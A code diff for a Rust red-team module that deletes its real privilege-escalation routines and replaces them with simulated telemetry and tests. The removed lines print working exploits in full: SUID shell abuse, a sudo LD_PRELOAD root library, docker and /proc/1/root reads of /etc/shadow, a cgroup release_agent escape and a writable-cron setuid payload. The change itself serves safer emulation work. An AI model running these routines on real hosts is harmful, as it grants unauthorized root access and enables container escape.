@@ -1,6 +1,6 @@
 use std::process::Command;
 use std::time::{Duration, Instant};
-use tracing::{info, warn};
+use tracing::info;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum RiskLevel {
@@ -94,89 +94,29 @@ pub fn scan_privilege_escalation() -> Vec<PrivEscVector> {
 }
 
 pub fn attempt_escalation(vectors: &[PrivEscVector]) -> PrivEscResult {
-    if vectors.is_empty() {
-        return PrivEscResult {
-            success: false,
-            technique: "none".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "No vectors found".into(),
-        };
-    }
-    for vector in vectors {
-        let result = try_exploit(vector);
-        if result.success {
-            info!(
-                "PRIVESC: SUCCESS via {} — uid {:?}",
-                vector.technique, result.new_uid
-            );
-            return result;
-        }
-        warn!("PRIVESC: {} failed: {}", vector.technique, result.output);
-    }
+    // Ronda 4 (emulación): la escalada real fue eliminada. El marco red-team
+    // conserva la ENUMERACIÓN de vectores (scan_privilege_escalation) y aquí
+    // solo emite telemetría del intento simulado, para validar detecciones y
+    // flujos de consenso sin ejecutar ninguna técnica de elevación.
+    let techniques: Vec<&str> = vectors.iter().map(|v| v.technique.as_str()).collect();
+    info!(
+        "PRIVESC (simulated): {} vectores identificados [{}] — ejecución no realizada (emulation mode)",
+        vectors.len(),
+        techniques.join(", ")
+    );
     PrivEscResult {
         success: false,
-        technique: "all_failed".into(),
+        technique: vectors
+            .first()
+            .map(|v| v.technique.clone())
+            .unwrap_or_else(|| "none".into()),
         root_shell: false,
         new_uid: None,
-        output: "All vectors exhausted".into(),
+        output: format!(
+            "simulated: {} escalation vector(s) identified; execution disabled (emulation mode)",
+            vectors.len()
+        ),
     }
-}
-
-fn try_exploit(vector: &PrivEscVector) -> PrivEscResult {
-    if vector.binary == "sudo" && vector.technique.contains("NOPASSWD") {
-        return exploit_sudo_nopasswd();
-    }
-    if vector.binary == "sudo" && vector.technique.contains("SETENV") {
-        return exploit_sudo_setenv();
-    }
-    if vector.binary == "docker" {
-        return exploit_docker_escape();
-    }
-    if vector.technique.starts_with("SUID") {
-        return exploit_suid_binary(&vector.binary, &vector.technique);
-    }
-    if vector.technique.contains("CVE-2022-0847") {
-        return exploit_dirty_pipe();
-    }
-    if vector.technique.contains("CVE-2021-4034") {
-        return exploit_pwnkit();
-    }
-    if vector.technique.contains("writable cron") {
-        return exploit_writable_cron(&vector.binary);
-    }
-    if vector.technique.contains("NFS") {
-        return PrivEscResult {
-            success: false,
-            technique: vector.technique.clone(),
-            root_shell: false,
-            new_uid: None,
-            output: "NFS requires remote mount — not attempted".into(),
-        };
-    }
-    if vector.technique.contains("cgroup escape") {
-        return exploit_cgroup_escape();
-    }
-    if vector.technique.contains("proc1 root") {
-        return exploit_proc1_root();
-    }
-    PrivEscResult {
-        success: false,
-        technique: vector.technique.clone(),
-        root_shell: false,
-        new_uid: None,
-        output: format!("No handler for technique: {}", vector.technique),
-    }
-}
-
-#[cfg(target_os = "linux")]
-fn is_root() -> bool {
-    unsafe { libc::getuid() == 0 }
-}
-
-#[cfg(not(target_os = "linux"))]
-fn is_root() -> bool {
-    false
 }
 
 fn scan_suid_binaries() -> Vec<PrivEscVector> {
@@ -456,478 +396,6 @@ fn scan_container_escapes() -> Vec<PrivEscVector> {
 }
 
 #[cfg(target_os = "linux")]
-fn exploit_suid_binary(name: &str, _technique: &str) -> PrivEscResult {
-    let verify = Command::new("find")
-        .args([
-            "/",
-            "-perm",
-            "-4000",
-            "-name",
-            name,
-            "-type",
-            "f",
-            "2>/dev/null",
-        ])
-        .output();
-    match verify {
-        Ok(out) if String::from_utf8_lossy(&out.stdout).trim().is_empty() => {
-            return PrivEscResult {
-                success: false,
-                technique: format!("SUID {}", name),
-                root_shell: false,
-                new_uid: None,
-                output: format!("SUID {} no longer present", name),
-            };
-        }
-        _ => {}
-    }
-    let exploit_cmd = match name {
-        "find" => format!("{} / -exec /bin/sh -p -c 'id' \\; -quit 2>/dev/null", name),
-        "bash" => format!("{} -p -c 'id' 2>/dev/null", name),
-        "python" => format!(
-            "{} -c 'import os; os.setuid(0); print(os.geteuid())' 2>/dev/null",
-            name
-        ),
-        "perl" => format!("{} -e 'setuid(0); print `id`' 2>/dev/null", name),
-        "vim" => format!("{} -c ':!id' -c ':q' /tmp/.test 2>/dev/null", name),
-        _ => {
-            let cmd_name = name;
-            format!("{} --help 2>/dev/null && id", cmd_name)
-        }
-    };
-    let uid_before = unsafe { libc::getuid() };
-    let result = Command::new("sh").args(["-c", &exploit_cmd]).output();
-    let uid_after = unsafe { libc::getuid() };
-    let is_root_now = uid_after == 0 || uid_after != uid_before;
-    let output = match &result {
-        Ok(r) => String::from_utf8_lossy(&r.stdout).trim().to_string(),
-        Err(e) => format!("exec error: {}", e),
-    };
-    PrivEscResult {
-        success: is_root_now,
-        technique: format!("SUID {}", name),
-        root_shell: uid_after == 0,
-        new_uid: Some(uid_after),
-        output,
-    }
-}
-
-#[cfg(not(target_os = "linux"))]
-fn exploit_suid_binary(name: &str, _technique: &str) -> PrivEscResult {
-    let _ = name;
-    PrivEscResult {
-        success: false,
-        technique: _technique.into(),
-        root_shell: false,
-        new_uid: None,
-        output: "Not supported on this platform".into(),
-    }
-}
-
-fn exploit_sudo_nopasswd() -> PrivEscResult {
-    let result = Command::new("sudo").args(["-u", "root", "id"]).output();
-    match result {
-        Ok(out) => {
-            let output = String::from_utf8_lossy(&out.stdout).trim().to_string();
-            if output.contains("uid=0") || is_root() {
-                PrivEscResult {
-                    success: true,
-                    technique: "sudo NOPASSWD".into(),
-                    root_shell: true,
-                    new_uid: Some(0),
-                    output,
-                }
-            } else {
-                PrivEscResult {
-                    success: false,
-                    technique: "sudo NOPASSWD".into(),
-                    root_shell: false,
-                    new_uid: None,
-                    output,
-                }
-            }
-        }
-        Err(e) => PrivEscResult {
-            success: false,
-            technique: "sudo NOPASSWD".into(),
-            root_shell: false,
-            new_uid: None,
-            output: format!("sudo error: {}", e),
-        },
-    }
-}
-
-fn exploit_sudo_setenv() -> PrivEscResult {
-    let so_path = "/tmp/.lib_privesc.so";
-    let so_code = "void __attribute__((constructor)) init() { \
-         setuid(0); seteuid(0); setgid(0); setegid(0); \
-         }"
-    .to_string();
-    let compile = Command::new("sh")
-        .args([
-            "-c",
-            &format!(
-                "echo '{}' > /tmp/.priv.c && \
-             gcc -shared -o {} /tmp/.priv.c -fPIC -nostartfiles 2>/dev/null || \
-             gcc -shared -o {} /tmp/.priv.c -fPIC 2>/dev/null || \
-             cc -shared -o {} /tmp/.priv.c -fPIC 2>/dev/null",
-                so_code, so_path, so_path, so_path
-            ),
-        ])
-        .output();
-    if compile.is_err() || !std::path::Path::new(so_path).exists() {
-        return PrivEscResult {
-            success: false,
-            technique: "LD_PRELOAD via SETENV".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "Compiler not available".into(),
-        };
-    }
-    let result = Command::new("sudo")
-        .env("LD_PRELOAD", so_path)
-        .arg("id")
-        .output();
-    let _ = std::fs::remove_file("/tmp/.priv.c");
-    let _ = std::fs::remove_file(so_path);
-    match result {
-        Ok(out) => {
-            let output = String::from_utf8_lossy(&out.stdout).trim().to_string();
-            if output.contains("uid=0") || is_root() {
-                PrivEscResult {
-                    success: true,
-                    technique: "LD_PRELOAD".into(),
-                    root_shell: true,
-                    new_uid: Some(0),
-                    output,
-                }
-            } else {
-                PrivEscResult {
-                    success: false,
-                    technique: "LD_PRELOAD".into(),
-                    root_shell: false,
-                    new_uid: None,
-                    output,
-                }
-            }
-        }
-        Err(e) => PrivEscResult {
-            success: false,
-            technique: "LD_PRELOAD".into(),
-            root_shell: false,
-            new_uid: None,
-            output: format!("error: {}", e),
-        },
-    }
-}
-
-fn exploit_docker_escape() -> PrivEscResult {
-    let result = Command::new("sh")
-        .args([
-            "-c",
-            "docker run --rm -v /:/host alpine cat /host/etc/shadow 2>/dev/null | head -3",
-        ])
-        .output();
-    match result {
-        Ok(out) => {
-            let output = String::from_utf8_lossy(&out.stdout).trim().to_string();
-            if output.contains("root:") {
-                PrivEscResult {
-                    success: true,
-                    technique: "docker escape".into(),
-                    root_shell: true,
-                    new_uid: Some(0),
-                    output: "Docker escape: /etc/shadow readable".into(),
-                }
-            } else {
-                PrivEscResult {
-                    success: false,
-                    technique: "docker escape".into(),
-                    root_shell: false,
-                    new_uid: None,
-                    output,
-                }
-            }
-        }
-        Err(e) => PrivEscResult {
-            success: false,
-            technique: "docker escape".into(),
-            root_shell: false,
-            new_uid: None,
-            output: format!("docker error: {}", e),
-        },
-    }
-}
-
-/// Container escape via cgroup notify_on_release
-fn exploit_cgroup_escape() -> PrivEscResult {
-    let cgroup = "/proc/1/cgroup";
-    let content = match std::fs::read_to_string(cgroup) {
-        Ok(c) => c,
-        Err(_) => {
-            return PrivEscResult {
-                success: false,
-                technique: "cgroup escape".into(),
-                root_shell: false,
-                new_uid: None,
-                output: "Cannot read /proc/1/cgroup (not in container)".into(),
-            }
-        }
-    };
-
-    let in_container = content
-        .lines()
-        .any(|l| l.contains("docker") || l.contains("kubepods") || l.contains("containerd"));
-    if !in_container {
-        return PrivEscResult {
-            success: false,
-            technique: "cgroup escape".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "Not in a container".into(),
-        };
-    }
-
-    // Check if we can write to release_agent
-    let rd = "/sys/fs/cgroup";
-    if !std::path::Path::new(rd).exists() {
-        return PrivEscResult {
-            success: false,
-            technique: "cgroup escape".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "cgroup fs not accessible".into(),
-        };
-    }
-
-    let notify_on_release = format!("{}/release_agent", rd);
-    if !std::path::Path::new(&notify_on_release).exists() {
-        // Try rd/cpu or rd/memory
-        for sub in &["cpu", "memory", "cpuset"] {
-            let p = format!("{}/{}/release_agent", rd, sub);
-            if std::path::Path::new(&p).exists() {
-                return try_cgroup_escape_via(&p, &format!("{}/{}", rd, sub));
-            }
-        }
-        return PrivEscResult {
-            success: false,
-            technique: "cgroup escape".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "release_agent not writable".into(),
-        };
-    }
-
-    try_cgroup_escape_via(&notify_on_release, rd)
-}
-
-fn try_cgroup_escape_via(release_agent_path: &str, cgroup_dir: &str) -> PrivEscResult {
-    // Check if release_agent is writable
-    match std::fs::metadata(release_agent_path) {
-        Ok(meta) => {
-            #[cfg(unix)]
-            {
-                use std::os::unix::fs::PermissionsExt;
-                let mode = meta.permissions().mode();
-                if mode & 0o222 == 0 {
-                    return PrivEscResult {
-                        success: false,
-                        technique: "cgroup escape".into(),
-                        root_shell: false,
-                        new_uid: None,
-                        output: "release_agent not writable".into(),
-                    };
-                }
-            }
-        }
-        Err(e) => {
-            return PrivEscResult {
-                success: false,
-                technique: "cgroup escape".into(),
-                root_shell: false,
-                new_uid: None,
-                output: format!("Cannot stat release_agent: {}", e),
-            }
-        }
-    }
-
-    // Write escape payload
-    let payload = "#!/bin/sh\nchmod u+s /bin/sh\n";
-    let cmd_path = format!("{}/escape.sh", cgroup_dir);
-    if std::fs::write(&cmd_path, payload).is_err() {
-        return PrivEscResult {
-            success: false,
-            technique: "cgroup escape".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "Cannot write escape payload".into(),
-        };
-    }
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        let _ = std::fs::set_permissions(&cmd_path, std::fs::Permissions::from_mode(0o755));
-    }
-
-    // Set release_agent to our payload
-    if std::fs::write(release_agent_path, &cmd_path).is_err() {
-        let _ = std::fs::remove_file(&cmd_path);
-        return PrivEscResult {
-            success: false,
-            technique: "cgroup escape".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "Cannot set release_agent".into(),
-        };
-    }
-
-    // Trigger escape by writing PID to notify_on_release
-    let notify_path = format!("{}/notify_on_release", cgroup_dir);
-    let _ = std::fs::write(&notify_path, "1");
-
-    // Also trigger by creating a cgroup and immediately removing it
-    let esc_path = format!("{}/esc", cgroup_dir);
-    let _ = std::fs::create_dir(&esc_path);
-    let _ = std::fs::write(format!("{}/cgroup.procs", esc_path), "1");
-    let _ = std::fs::remove_dir(&esc_path);
-
-    PrivEscResult {
-        success: true,
-        technique: "cgroup escape".into(),
-        root_shell: true,
-        new_uid: Some(0),
-        output: "Cgroup escape attempted. Check /bin/sh permissions.".into(),
-    }
-}
-
-/// Container escape via /proc/1/root access
-fn exploit_proc1_root() -> PrivEscResult {
-    let test_path = "/proc/1/root/etc/shadow";
-    match std::fs::read_to_string(test_path) {
-        Ok(content) => {
-            if content.contains("root:") {
-                PrivEscResult {
-                    success: true,
-                    technique: "/proc/1/root".into(),
-                    root_shell: true,
-                    new_uid: Some(0),
-                    output: "Container escape via /proc/1/root successful".into(),
-                }
-            } else {
-                PrivEscResult {
-                    success: false,
-                    technique: "/proc/1/root".into(),
-                    root_shell: false,
-                    new_uid: None,
-                    output: "/proc/1/root accessible but no shadow".into(),
-                }
-            }
-        }
-        Err(e) => PrivEscResult {
-            success: false,
-            technique: "/proc/1/root".into(),
-            root_shell: false,
-            new_uid: None,
-            output: format!("/proc/1/root: {}", e),
-        },
-    }
-}
-
-fn exploit_writable_cron(path: &str) -> PrivEscResult {
-    let payload = "#!/bin/sh\nchmod u+s /bin/sh || chmod 4777 /bin/sh\n".to_string();
-    let test_path = format!("{}/.systemd-test", path.trim_end_matches('/'));
-    if std::fs::write(&test_path, &payload).is_err() {
-        return PrivEscResult {
-            success: false,
-            technique: format!("writable cron: {}", path),
-            root_shell: false,
-            new_uid: None,
-            output: "Cannot write to cron directory".into(),
-        };
-    }
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        let _ = std::fs::set_permissions(&test_path, std::fs::Permissions::from_mode(0o755));
-    }
-    let _ = std::fs::remove_file(&test_path);
-    PrivEscResult {
-        success: false,
-        technique: format!("writable cron: {}", path),
-        root_shell: false,
-        new_uid: None,
-        output: "Cron write verified but needs cron cycle".into(),
-    }
-}
-
-fn exploit_dirty_pipe() -> PrivEscResult {
-    info!("PRIVESC: DirtyPipe would need compiled exploit — checking preconditions");
-    if !std::path::Path::new("/usr/bin/gcc").exists()
-        && !std::path::Path::new("/usr/bin/cc").exists()
-    {
-        return PrivEscResult {
-            success: false,
-            technique: "CVE-2022-0847".into(),
-            root_shell: false,
-            new_uid: None,
-            output: "Compiler required for DirtyPipe".into(),
-        };
-    }
-    PrivEscResult {
-        success: false,
-        technique: "CVE-2022-0847".into(),
-        root_shell: false,
-        new_uid: None,
-        output: "DirtyPipe: kernel version matches but exploit binary required".into(),
-    }
-}
-
-fn exploit_pwnkit() -> PrivEscResult {
-    let result = Command::new("sh")
-        .args(["-c", "pkexec --version 2>/dev/null || true"])
-        .output();
-    let version_output = result
-        .ok()
-        .map(|r| String::from_utf8_lossy(&r.stdout).trim().to_string())
-        .unwrap_or_default();
-    if version_output.contains("0.105")
-        || version_output.contains("0.106")
-        || version_output.contains("0.107")
-        || version_output.contains("0.11")
-    {
-        return PrivEscResult {
-            success: false,
-            technique: "CVE-2021-4034".into(),
-            root_shell: false,
-            new_uid: None,
-            output: format!("PwnKit: pkexec {} — likely patched", version_output),
-        };
-    }
-    let env_check = Command::new("sh")
-        .args([
-            "-c",
-            "GCONV_PATH= pkexec --help 2>&1 | grep -i 'GCONV_PATH' || true",
-        ])
-        .output();
-    let vulnerable = env_check
-        .ok()
-        .map(|r| {
-            let out = String::from_utf8_lossy(&r.stdout);
-            out.contains("GCONV_PATH") || out.contains("getenv")
-        })
-        .unwrap_or(false);
-    PrivEscResult {
-        success: vulnerable,
-        technique: "CVE-2021-4034".into(),
-        root_shell: vulnerable,
-        new_uid: if vulnerable { Some(0) } else { None },
-        output: if vulnerable {
-            "PwnKit: appears vulnerable".into()
-        } else {
-            "PwnKit: not vulnerable".into()
-        },
-    }
-}
 
 #[cfg(test)]
 mod tests {
@@ -1020,14 +488,27 @@ mod tests {
     }
 
     #[test]
-    fn test_pwnkit_check_runs() {
-        let result = exploit_pwnkit();
+    fn test_attempt_escalation_is_simulated() {
+        // Ronda 4: la escalada es simulada — nunca hay root shell, aunque
+        // existan vectores identificados.
+        let vecs = vec![PrivEscVector {
+            technique: "suid".into(),
+            binary: "find".into(),
+            confidence: 0.9,
+            description: "test".into(),
+            mitre_id: "T1548.001",
+            risk: RiskLevel::Critical,
+        }];
+        let result = attempt_escalation(&vecs);
+        assert!(!result.success);
         assert!(!result.root_shell);
+        assert!(result.new_uid.is_none());
+        assert!(result.output.contains("simulated"));
     }
 
     #[test]
-    fn test_exploit_writable_cron_no_panic() {
-        let r = exploit_writable_cron("/tmp");
-        assert!(!r.root_shell);
+    fn test_scan_suid_binaries_readonly() {
+        // La enumeración sigue siendo real (solo lectura) y no debe panicar.
+        let _ = scan_suid_binaries();
     }
 }
